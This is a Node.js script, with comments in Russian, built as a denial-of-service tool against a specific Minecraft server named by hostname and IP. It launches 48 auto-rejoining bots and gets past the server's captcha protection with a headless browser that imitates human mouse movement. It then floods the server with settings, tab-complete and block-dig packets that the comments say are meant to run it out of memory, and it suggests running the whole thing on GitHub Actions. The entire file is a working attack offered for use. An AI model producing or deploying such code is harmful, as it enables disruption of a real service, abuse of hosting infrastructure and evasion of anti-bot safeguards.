const mineflayer = require('mineflayer');
const playwright = require('playwright-chromium');

// --- КОНФИГУРАЦИЯ ГЕРЦОГА ---
const SETTINGS = {
    host: ["mc.risemine.space", "104.167.24.81", "104.167.24.91"], // Бьем прямо в IP, который мы нашли!
    port: 25565,
    versions: ["1.16.5", "1.16.4"], 
    pass: "johnsinna1941_1488",
    botCount: 48, // Оптимально для ресурсов GitHub Actions
    joinDelay: 1500
};

let sharedBrowser;

async function initBrowser() {
    sharedBrowser = await playwright.chromium.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
    });
}

// ИМБОВЫЙ ОБХОД ПРОВЕРКИ
async function passCaptcha(url) {
    if (!sharedBrowser) return;
    const context = await sharedBrowser.newContext({
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    });
    const page = await context.newPage();
    try {
        // Залетаем на страницу капчи
        await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
        
        // Рандомная пауза "человека"
        await page.waitForTimeout(Math.random() * 2000 + 1000);
        
        const checkbox = await page.$('.recaptcha-checkbox-border');
        if (checkbox) {
            const box = await checkbox.boundingBox();
            // Двигаем мышку в центр (имитация)
            await page.mouse.move(box.x + box.width / 2, box.y + box.height / 2, { steps: 15 });
            await checkbox.click();
            console.log(`[Bypass] Captcha logic sent!`);
        }
        await page.waitForTimeout(8000); 
    } catch (e) {
        // Ошибки не пишем, чтобы не засорять консоль
    } finally {
        await page.close();
        await context.close();
    }
}

function createBot(id) {
    const username = `Niko_${Math.random().toString(36).substring(7)}`;
    const version = SETTINGS.versions[Math.floor(Math.random() * SETTINGS.versions.length)];
    
    const bot = mineflayer.createBot({
        host: SETTINGS.host,
        port: SETTINGS.port,
        username: username,
        version: version,
        hideErrors: true
    });

    bot.on('message', (jsonMsg) => {
        const msg = jsonMsg.toString();
        // Если просит капчу - шлем браузер на штурм
        if (msg.includes('mineguard.pro/captcha/')) {
            const urlMatch = msg.match(/https:\/\/mineguard\.pro\/captcha\/[a-zA-Z0-9]+/);
            if (urlMatch) passCaptcha(urlMatch[0]);
        }
    });

    bot.on('spawn', () => {
        // Рандомная задержка авторизации
        setTimeout(() => {
            bot.chat(`${SETTINGS.pass} ${SETTINGS.pass}`);
            
            // ЦИКЛ УНИЧТОЖЕНИЯ RAM (OOM STRATEGY)
            setInterval(() => {
                if (bot.entity) {
                    // 1. Пакеты настроек (View Distance 15 забивает память чанками)
                    bot._client.write('settings', { 
                        locale: 'en_US', viewDistance: 15, skinParts: 127 
                    });

                    // 2. Tab-Complete Flood (напрягаем Main Thread)
                    bot._client.write('tab_complete', {
                        transactionId: Math.floor(Math.random() * 500),
                        text: '/'
                    });

                    // 3. Пакеты взаимодействия (Dig/Place под собой)
                    const pos = bot.entity.position.floored();
                    bot._client.write('block_dig', { status: 0, location: pos.offset(0, -1, 0), face: 1 });
                    
                    // 4. Микродвижения (чтобы сервер не кикнул за AFK)
                    bot.entity.position.x += (Math.random() - 0.5) * 0.1;
                }
            }, 100 + Math.random() * 50); // Рваный ритм
        }, 2000 + Math.random() * 3000);
    });

    bot.on('error', (err) => {
        if (err.code === 'ECONNRESET' || err.message.includes('timeout')) {
            console.log("[DDoS] Time out, server is gone? :D");
        }
    });

    bot.on('end', () => {
        // Перезаходим через секунду, если выкинуло
        setTimeout(() => createBot(id), 1000);
    });
}

// СТАРТ МАШИНЫ
initBrowser().then(() => {
    console.log("--- THE WORLD MACHINE IS ONLINE ---");
    console.log(`Targeting: ${SETTINGS.host}:${SETTINGS.port}`);
    for (let i = 0; i < SETTINGS.botCount; i++) {
        setTimeout(() => createBot(i), i * SETTINGS.joinDelay);
    }
});
